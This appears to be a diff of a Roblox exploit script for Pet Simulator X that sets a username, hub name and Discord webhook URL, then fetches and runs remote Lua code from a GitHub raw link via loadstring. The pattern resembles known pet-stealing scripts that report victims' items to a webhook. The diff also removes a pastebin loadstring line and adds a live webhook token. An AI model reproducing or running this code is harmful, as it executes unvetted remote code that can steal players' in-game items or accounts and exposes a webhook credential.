@@ -1,6 +1,5 @@
 _G.Username = "expertgameplayz"
 _G.HubName = "petsimx"
-_G.WebhookUrl = "loadstring(game:HttpGet("https://pastebin.com/raw/atLtLcQg"))()
-"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1095037519025946754/wWWO7z2h5LwY58El05dbmm02F1RPMOCfoFfE2zjAYMceS70QZX48hWUUfS6cxmBhSPTa"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
